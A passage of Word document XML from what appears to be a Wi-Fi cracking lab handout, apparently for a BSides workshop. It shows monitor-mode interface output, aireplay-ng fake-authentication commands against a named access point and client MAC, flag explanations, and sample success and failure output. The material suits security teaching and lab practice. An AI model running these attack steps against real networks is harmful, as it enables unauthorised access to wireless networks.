          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">     no wireless extensions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FCD0F2C"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wlan0mon</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      IEEE 802.11g  ESSID:""  Nickname:""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18CBC116"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Mode</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>:Monitor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  Frequency:2.452 GHz  Access Point: 00:09:5B:EC:EE:F2   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BBB2203"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Bit Rate:0 kb/s   Tx-Power</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>:15</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">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Sensitivity=0/3  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3514AFB2"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Retry:off</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   RTS </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>thr:off</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   Fragment </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>thr:off</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="75A51B00"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Encryption </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>key:off</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5A09B8F3"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Power </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Management:off</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4209161F"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Link Quality=0/</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>94  Signal</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> level=-98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Noise level=-98 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>dBm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="71A286EA"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Rx invalid </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">nwid:0  </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Rx invalid </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">crypt:0  </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Rx invalid frag:0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="031EAF2E"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Tx</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> excessive </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">retries:0  </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Invalid </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">misc:0   </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Missed beacon:0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B33280A" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0493E78C" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39269D28"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2 -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1967E352" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="418887D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2DCF649F" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0853FF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associate with an access point, use fake authentication:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="198665DA" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53FE2985" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="002A56B4"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aireplay</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-1 0 -e BSIDES -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="588BBE8A" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="04198B3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62FDFFEA"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454F8C6C"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17CAF1F7"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5FB14554"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2EBD94FD"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our card MAC address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A096FD9"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1714ABAE" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F0AEF81"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Success looks like:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3192F1AB"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Authentication Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D4E03BC"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Authentication</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> successful</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64F24299"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Association Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CF1D8CD"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Association</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> successful :-)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2516F58F" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7CD7348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Or another variation for picky access points:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="670821F8" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E0C26FF"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-1 6000 -o 1 -q 10 -e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>BSIDES</w:t>
      </w:r>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7340E0CC" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00F80E8E" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1AFCDBF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1901F58"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6000 - </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Reauthenticate</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> very 6000 seconds. The long period also causes keep alive packets to be sent.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="410F7A24"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o</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1 - Send only one set of packets at a time. Default is multiple and this confuses some APs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09CD84A2"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q</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 10 - Send keep alive packets every 10 seconds.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C65EE41" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D71FE51"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Success looks like:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="793646EF"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Authentication Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="324C330A"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Authentication</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> successful</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="304ED5FC"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Association Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B73E5BC"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Association</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> successful :-)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08413830"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18:22:42  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> keep-alive packet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4915499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18:22:52  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> keep-alive packet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50B478D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r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>and</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> so on.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="368C0A20" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00F37B2B" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Here is an example of what a failed authentication looks like:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="356D2E70"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8:28:02  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Authentication Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="389B5D19"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Authentication</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> successful</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B4F5CD4"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Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Association Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EA8F53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Association</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> successful :-)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62D38A9B"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Got</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>deauthentication</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6879377F"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Authentication Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D52DF27"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Authentication</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> successful</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F4790B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Association Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37889DF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Authentication Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F21F25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Authentication</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> successful</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="245BB281"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Association Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CDBB4B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Notice the “Got a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>deauthentication</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet” and the continuous retries above. Do not proceed to the next step until you have the fake authentication running correctly.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43B18124" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
